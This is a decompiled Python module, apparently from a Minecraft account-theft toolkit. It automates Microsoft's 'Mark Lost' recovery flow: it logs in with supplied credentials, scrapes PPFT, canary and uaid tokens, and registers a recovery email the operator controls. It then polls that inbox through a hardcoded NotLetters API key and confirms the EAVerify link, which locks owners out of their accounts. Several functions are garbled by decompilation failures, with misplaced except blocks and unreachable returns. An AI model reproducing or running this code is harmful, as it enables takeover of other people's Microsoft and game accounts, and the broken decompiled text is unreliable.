# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: 'src\\automation\\auto_mark_lost.py'
# Bytecode version: 3.13.0rc3 (3571)
# Source timestamp: 1970-01-01 00:00:00 UTC (0)

"""\nAuto Mark Lost - CORRECT VERSION\nBased on working v4_recovery_tool implementation\nUses proper Microsoft login flow with PPFT tokens and challenge handling\n"""
import requests
import re
import time
from typing import Optional, Dict, Tuple
from src.utils.logger import get_logger
logger = get_logger()
def extract_value(text: str, pattern: str, group: int=1) -> Optional[str]:
    """Extract a value using regex pattern"""
    match = re.search(pattern, text, re.DOTALL)
    return match.group(group) if match else None
def decode_unicode_escapes(text: str) -> str:
    """Decode unicode escapes"""
    try:
        return text.encode('utf-8').decode('unicode_escape')
    except:
        return text
def extract_ppft_and_urlpost(html: str) -> Tuple[Optional[str], Optional[str]]:
    """Extract PPFT token and urlPost from login page"""
    # ***<module>.extract_ppft_and_urlpost: Failure: Different bytecode
    ppft = None
    for pattern in ['name=\"PPFT\"[^>]*value=\"([^\"]+)\"', 'value=\"([^\"]+)\"[^>]*name=\"PPFT\"', 'sFTTag[\"\\\']:\\s*[\"\\\']<input[^>]*value=\\\\\"([^\"\\\\]+)\\\\\"', '\"PPFT\"[^}]*\"value\"\\s*:\\s*\"([^\"]+)\"']:
        ppft = extract_value(html, pattern)
        if ppft:
            break
    urlpost = None
    for pattern in ['\"urlPost\"\\s*:\\s*\"([^\"]+)\"', '\'urlPost\'\\s*:\\s*\'([^\']+)\'']:
        urlpost = extract_value(html, pattern)
        if urlpost:
            return (ppft, urlpost)
    return (ppft, urlpost)
def extract_canary(html: str) -> Optional[str]:
    """Extract apiCanary from page HTML"""
    for pattern in ['\"apiCanary\"\\s*:\\s*\"([^\"]+)\"', '\"canary\"\\s*:\\s*\"([^\"]+)\"']:
        canary = extract_value(html, pattern)
        if canary:
            return decode_unicode_escapes(canary)
def extract_uaid(text: str) -> Optional[str]:
    """Extract uaid from page HTML or URL"""
    for pattern in ['\"uaid\"\\s*:\\s*\"([a-f0-9]{32})\"', 'uaid=([a-f0-9]{32})']:
        uaid = extract_value(text, pattern)
        if uaid:
            return uaid
BASE_HEADERS = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.9', 'Accept-Encoding': 'gzip, deflate, br'}
API_HEADERS = {'Accept': 'application/json', 'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'en-US,en;q=0.9', 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'x-ms-apitransport': 'xhr', 'x-ms-apiversion': '2'}
class AutoMarkLost:
    """Auto Mark Lost using CORRECT Microsoft login flow"""
    def __init__(self, config: dict, notletters_pool=None):
        """\nInitialize Auto Mark Lost\n\nArgs:\n    config: Automation configuration\n    notletters_pool: Optional NotLettersPool instance\n"""
        self.config = config
        self.automation_config = config.get('automation', {})
        self.enabled = self.automation_config.get('auto_mark_lost', False)
        self.email_provider = self.automation_config.get('email_provider', 'custom')
        self.custom_email = self.automation_config.get('mark_lost_email', '')
        self.notletters_pool = notletters_pool
        user_api_key = self.automation_config.get('notletters_api_key', '').strip()
        self.notletters_api_key = user_api_key if user_api_key else 'vFgjakA5QMdsSKruKwbeaaiHR5cS5KIQ'
    def should_attempt(self, minecraft_data: Dict=None) -> bool:
        """\nCheck if we should attempt Mark Lost\nONLY requirement: Minecraft Java OWNED\n\nArgs:\n    minecraft_data: Minecraft ownership data\n\nReturns:\n    True if should attempt Mark Lost\n"""
        if not self.enabled:
            return False
        else:
            if not minecraft_data:
                return False
            else:
                ownership = minecraft_data.get('ownership', {})
                if not ownership.get('minecraft_java_owned'):
                    logger.debug('Skipping Mark Lost: No Java ownership')
                    return False
                else:
                    if ownership.get('minecraft_java_gamepass') and (not ownership.get('minecraft_java_owned')):
                        logger.debug('Skipping Mark Lost: Game Pass only, not owned')
                        return False
                    else:
                        logger.debug('✅ Auto Mark Lost: Eligible (has Java owned)')
                        return True
    def execute(self, email: str, password: str, minecraft_data: Dict) -> Dict:
        """\nExecute Auto Mark Lost - ONLY requirement: Minecraft Java OWNED\n\nArgs:\n    email: Account email\n    password: Account password  \n    minecraft_data: Minecraft ownership data\n\nReturns:\n    Result dictionary\n"""
        # ***<module>.AutoMarkLost.execute: Failure: Different bytecode
        if not self.should_attempt(minecraft_data):
            return {'attempted': False, 'success': False, 'reason': 'No Minecraft Java ownership', 'new_recovery_email': None}
        else:
            logger.info(f'🔄 Auto Mark Lost: Starting for {email}')
            recovery_data = self._get_recovery_email_data(email)
            if not recovery_data:
                logger.error('Failed to get recovery email')
                return {'attempted': False, 'success': False, 'reason': 'Could not get recovery email', 'new_recovery_email': None}
            else:
                recovery_email = recovery_data['email']
                recovery_password = recovery_data['password']
                logger.info(f'📧 Using recovery email: {recovery_email}')
                session = requests.Session()
                session.headers.update(BASE_HEADERS)
                login_success, login_msg = self._microsoft_login(session, email, password)
                if not login_success:
                    logger.warning(f'❌ Login failed: {login_msg}')
                    return {'attempted': True, 'success': False, 'reason': f'Login failed: {login_msg}', 'new_recovery_email': None}
                else:
                    logger.debug('✅ Logged in successfully')
                    submit_success, submit_msg = self._submit_recovery_email(session, recovery_email)
                    if not submit_success:
                        logger.warning(f'❌ Submit failed: {submit_msg}')
                        return {'attempted': True, 'success': False, 'reason': submit_msg, 'new_recovery_email': None}
                    else:
                        logger.info(f'✅ Verification email sent to {recovery_email}')
                        logger.info('📬 Waiting for verification email...')
                        verification_link = self._wait_for_verification_email(recovery_email, recovery_password)
                        if not verification_link:
                            logger.warning('❌ No verification email received')
                            return {'attempted': True, 'success': False, 'reason': 'Verification email not received', 'new_recovery_email': None}
                        else:
                            logger.info('✅ Got verification link!')
                            logger.info('🔗 Verifying link...')
                            verify_success, verify_msg = self._verify_link(email, verification_link)
                            if verify_success:
                                logger.info(f'✅ Auto Mark Lost: COMPLETE SUCCESS for {email}')
                                logger.info(f'📧 Recovery email: {recovery_email}')
                                return {'attempted': True, 'success': True, 'reason': f'Recovery email changed and verified: {verify_msg}', 'new_recovery_email': recovery_email}
                            else:
                                logger.warning(f'❌ Verification failed: {verify_msg}')
                                return {'attempted': True, 'success': False, 'reason': f'Verification failed: {verify_msg}', 'new_recovery_email': None}
    def _get_recovery_email_data(self, original_email: str) -> Optional[Dict]:
        # irreducible cflow, using cdg fallback
        """\nGet recovery email data (email + password) from configured source\n\nReturns:\n    Dict with \'email\' and \'password\' keys, or None\n"""
        # ***<module>.AutoMarkLost._get_recovery_email_data: Failure: Compilation Error
        if self.email_provider == 'custom':
            if not self.custom_email:
                return
                return {'email': self.custom_email, 'password': ''}
            if self.email_provider == 'notletters':
                if not self.notletters_pool:
                    logger.error('NotLetters pool not initialized')
                        return
                    email_data = self.notletters_pool.get_email(original_email)
                    return email_data
                if self.email_provider == 'random':
                    import random
                    import string
                    random_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
                    return {'email': f'{random_str}@tempmail.com', 'password': ''}
                    except Exception as e:
                            logger.error(f'Error getting recovery email: {e}')
                                return None
    def _microsoft_login(self, session: requests.Session, email: str, password: str) -> Tuple[bool, str]:
        # irreducible cflow, using cdg fallback
        """\nLogin to Microsoft and get to MarkLost page\nUses CORRECT flow from working recovery tool\n"""
        # ***<module>.AutoMarkLost._microsoft_login: Failure: Compilation Error
        response = session.get('https://account.live.com/proofs/MarkLost', headers=BASE_HEADERS, allow_redirects=True, timeout=30)
        if 'MarkLost' in response.url and 'login' not in response.url:
            return (True, response.url)
            if 'login.live.com' not in response.url:
                return (False, f'Unexpected URL: {response.url}')
                ppft, urlpost = extract_ppft_and_urlpost(response.text)
                if not ppft or not urlpost:
                    return (False, 'Could not find login tokens')
                        login_data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': ppft, 'PPSX': 'Passp', 'type': '11', 'LoginOptions': '3', 'ps': '2', 'NewUser': '1', 'fspost': '0', 'i21': '0', 'CookieDisclosure': '0', 'IsFidoSupported': '1'}
                        login_response = session.post(urlpost, data=login_data, headers={**BASE_HEADERS, 'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=True, timeout=30)
                        if 'Your account or password is incorrect' in login_response.text:
                            return (False, 'incorrect_password')
                            if 'Too Many Requests' in login_response.text:
                                return (False, 'rate_limited')
                                current_response = login_response
                                if 'ppsecure' in current_response.url or 'verify' in current_response.text.lower():
                                    scft = extract_value(current_response.text, '\"scft\"\\s*:\\s*\"([^\"]+)\"')
                                    if not scft:
                                        scft = extract_value(current_response.text, 'scft=([^&\"]+)')
                                    uaid = extract_uaid(current_response.text) or extract_uaid(current_response.url)
                                    opid = extract_value(current_response.url, 'opid=([^&]+)')
                                    if uaid and scft:
                                        lostproofs_url = f'https://login.live.com/login.srf?id=38936&lostproofs=1&uaid={uaid}&scft={scft}'
                                        if opid:
                                            lostproofs_url += f'&opid={opid}'
                                        lp_response = session.get(lostproofs_url, allow_redirects=True, timeout=30)
                                        if 'MarkLost' in lp_response.url or 'account.live.com/proofs' in lp_response.url:
                                            return (True, lp_response.url)
                                            current_response = lp_response
                                        form_action = extract_value(current_response.text, 'action=\"([^\"]*(?:MarkLost|lostproofs)[^\"]*)\"')
                                        if form_action:
                                            form_data = {}
                                            for field in ['pprid', 'ipt', 'uaid', 'NAP', 'ANON', 't', 'ctx']:
                                                val = extract_value(current_response.text, f'name=\"{field}\"[^>]*value=\"([^\"]*)\"')
                                                if val:
                                                    form_data[field] = val
                                            if form_data:
                                                form_response = session.post(form_action if form_action.startswith('http') else f'https://login.live.com{form_action}', data=form_data, allow_redirects=True, timeout=30)
                                                if 'MarkLost' in form_response.url:
                                                    return (True, form_response.url)
                                    ml_response = session.get('https://account.live.com/proofs/MarkLost', headers=BASE_HEADERS, allow_redirects=True, timeout=30)
                                    if 'MarkLost' in ml_response.url:
                                        return (True, ml_response.url)
                                        if 'Since you don' in ml_response.text or 'What security info' in ml_response.text:
                                            return (True, ml_response.url)
                                            if 'vetoed' in ml_response.text.lower():
                                                return (False, '30_day_lockout')
                                                return (False, 'Could not reach MarkLost')
                except Exception as e:
                        logger.error(f'Login error: {e}')
                        return (False, f'error: {str(e)}')
    def _submit_recovery_email(self, session: requests.Session, recovery_email: str) -> Tuple[bool, str]:
        # irreducible cflow, using cdg fallback
        """\nSubmit new recovery email via MarkLost API\nUses CORRECT API flow from working recovery tool\n"""
        # ***<module>.AutoMarkLost._submit_recovery_email: Failure: Compilation Error
        response = session.get('https://account.live.com/proofs/MarkLost', headers=BASE_HEADERS, allow_redirects=True, timeout=30)
        if 'vetoed' in response.text.lower():
            return (False, '30_day_lockout')
            canary = extract_canary(response.text)
            uaid = extract_uaid(response.text) or extract_uaid(response.url)
            hpgid = extract_value(response.text, '\"hpgid\"\\s*:\\s*(\\d+)') or '200426'
            scid = extract_value(response.text, '\"scid\"\\s*:\\s*(\\d+)') or '100162'
            tcxt = extract_value(response.text, '\"telemetryContext\"\\s*:\\s*\"([^\"]+)\"')
            if not canary or not uaid:
                return (False, 'Could not extract tokens')
                    api_headers = {**API_HEADERS, 'canary': canary, 'uaid': uaid, 'hpgid': str(hpgid), 'scid': str(scid), 'uiflvr': '1001', 'Origin': 'https://account.live.com', 'Referer': response.url}
                    if tcxt:
                        api_headers['tcxt'] = decode_unicode_escapes(tcxt)
                    payload = {'destination': recovery_email, 'channel': 'Email', 'allowUnconfirmed': True, 'allowUnverified': False, 'callContext': 'CatB', 'hpgid': int(hpgid), 'requestMessagePurpose': 'EAVerifyContactEmail', 'scid': int(scid), 'token': None, 'uaid': uaid, 'uiflvr': 1001}
                    api_response = session.post('https://account.live.com/API/Proofs/RequestMessage', json=payload, headers=api_headers, timeout=30)
                    if api_response.status_code == 200:
                        data = api_response.json()
                        if 'apiCanary' in data:
                            return (True, 'Verification email sent')
                            if 'error' in data:
                                error_code = data.get('error', {}).get('code', '')
                                if error_code == '1346':
                                    return (False, '2fa_required')
                                    if error_code == '1322':
                                        return (False, 'error_1322_rate_limit')
                                        return (False, f'API error: {error_code}')
                                    return (True, 'Request sent')
                        return (False, f'API failed: {api_response.status_code}')
                                                return (True, 'Request sent')
            except Exception as e:
                    logger.error(f'Submit error: {e}')
                    return (False, f'error: {str(e)}')
    def _wait_for_verification_email(self, recovery_email: str, recovery_password: str, timeout: int=60) -> Optional[str]:
        # irreducible cflow, using cdg fallback
        """\nWait for Microsoft verification email and extract link\nUses NotLetters API - matches email_client.py format\n"""
        # ***<module>.AutoMarkLost._wait_for_verification_email: Failure: Compilation Error
        import html
        import time
        start_time = time.time()
        start_timestamp = int(start_time) - 5
        poll_interval = 2
        logger.info(f'📡 Using NotLetters API for {recovery_email}')
        logger.info(f'📬 Waiting for verification email (timeout: {timeout}s)...')
        if time.time() - start_time < timeout:
            payload = {'email': recovery_email, 'password': recovery_password}
            headers = {'Authorization': f'Bearer {self.notletters_api_key}', 'Content-Type': 'application/json'}
            api_response = requests.post('https://api.notletters.com/v1/letters', json=payload, headers=headers, timeout=15)
            if api_response.status_code == 200:
                data = api_response.json()
                if 'data' in data and 'letters' in data['data']:
                    letters = data['data']['letters']
                    new_emails = [e for e in letters if e.get('date', 0) >= start_timestamp]
                    elapsed = int(time.time() - start_time)
                    logger.info(f'📧 Found {len(letters)} total emails, {len(new_emails)} new emails... ({elapsed}s / {timeout}s)')
                    for email_data in new_emails:
                            letter = email_data.get('letter', {})
                            body_html = letter.get('html', '')
                            body_text = letter.get('text', '')
                            body = body_html if body_html else body_text
                            if body:
                                body = html.unescape(body)
                                link = self._find_verification_link(body)
                                if link:
                                    logger.info('✅ Found verification link!')
                                    return link
                elapsed = int(time.time() - start_time)
                logger.info(f'📬 Checking inbox via API... ({elapsed}s / {timeout}s)')
                time.sleep(poll_interval)
                    logger.warning('⏰ Timeout waiting for verification email')
                except Exception as e:
                        logger.info(f'⚠️ Error checking API: {str(e)[:50]}')
    def _find_verification_link(self, text: str) -> Optional[str]:
        """Extract verification link from email body"""
        if not text:
            return
        else:
            patterns = ['https://account\\.live\\.com/Proofs/EAVerify[^\\s\"<>\\]\\)]+', 'https://account\\.live\\.com/proofs/[^\\s\"<>\\]\\)]+', 'https://account\\.live\\.com/resetpassword\\.aspx\\?[^\\s<>\"\\\']+', 'https://go\\.microsoft\\.com/[^\\s\"<>\\]\\)]*verify[^\\s\"<>\\]\\)]*']
            for pattern in patterns:
                matches = re.findall(pattern, text, re.IGNORECASE)
                if matches:
                    link = matches[0].rstrip('.').rstrip(',')
                    return link
            return
    def _verify_link(self, target_email: str, verification_link: str) -> Tuple[bool, str]:
        # irreducible cflow, using cdg fallback
        """\nVerify the link by POSTing to Microsoft\'s EAVerify endpoint\n"""
        # ***<module>.AutoMarkLost._verify_link: Failure: Compilation Error
        session = requests.Session()
        session.cookies.clear()
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.9'}
        response = session.get(verification_link, headers=headers, allow_redirects=True, timeout=30)
        canary = extract_canary(response.text)
        uaid = extract_uaid(response.text) or extract_uaid(response.url)
        token = extract_value(response.text, '\"token\"\\s*:\\s*\"([^\"]+)\"')
        if not token:
            token = extract_value(response.text, 'name=\"token\"[^>]*value=\"([^\"]+)\"')
        if token:
            token = decode_unicode_escapes(token)
        hpgid = extract_value(response.text, '\"hpgid\"\\s*:\\s*(\\d+)') or '200394'
        scid = extract_value(response.text, '\"scid\"\\s*:\\s*(\\d+)') or '100171'
        tcxt = extract_value(response.text, '\"telemetryContext\"\\s*:\\s*\"([^\"]+)\"')
        if tcxt:
            tcxt = decode_unicode_escapes(tcxt)
        if not canary or not uaid or (not token):
            return (False, 'Missing tokens')
            api_headers = {'Accept': 'application/json', 'Content-Type': 'application/json', 'Origin': 'https://account.live.com', 'Referer': response.url, 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'canary': canary, 'hpgid': str(hpgid), 'scid': str(scid), 'uaid': uaid, 'uiflvr': '1001', 'x-ms-apitransport': 'xhr', 'x-ms-apiversion': '2'}
            if tcxt:
                api_headers['tcxt'] = tcxt
            payload = {'accountName': target_email, 'hpgid': int(hpgid), 'phoneCountry': 'US', 'scid': int(scid), 'token': token, 'uaid': uaid, 'uiflvr': 1001}
            api_response = session.post('https://account.live.com/API/Recovery/EAVerify', json=payload, headers=api_headers, timeout=30)
            if api_response.status_code == 200:
                data = api_response.json()
                if 'apiCanary' in data:
                    recovery_date = data.get('recoveryDate', 'Unknown')
                    return (True, f'Verified! Active from {recovery_date}')
                    if 'error' in data:
                        error_code = data.get('error', {}).get('code', 'unknown')
                        return (False, f'Error {error_code}')
                            return (True, 'Verification submitted')
                return (False, f'HTTP {api_response.status_code}')
                            return (True, 'Verification submitted')
                except Exception as e:
                        logger.error(f'Verify error: {e}')
                        return (False, str(e))